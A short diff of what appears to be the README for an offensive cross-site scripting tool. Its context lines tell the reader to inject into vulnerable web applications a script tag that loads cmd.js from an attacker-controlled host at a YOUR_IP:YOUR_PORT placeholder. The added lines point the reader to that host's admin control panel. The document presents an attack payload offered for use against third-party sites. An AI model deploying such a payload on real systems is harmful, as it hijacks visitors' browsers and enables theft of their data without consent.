@@ -20,3 +20,10 @@ Inject the following payload into vulnerable web applications:
  ```bash
 <script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
 ```
+
+<br><div class="warning" style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 12px; margin: 20px 0; border-radius: 4px;"> <strong> 🌐 Access Control Panel</strong></div>
+
+Open your browser and navigate to:
+ ```bash
+http://YOUR_IP:YOUR_PORT/admin
+```
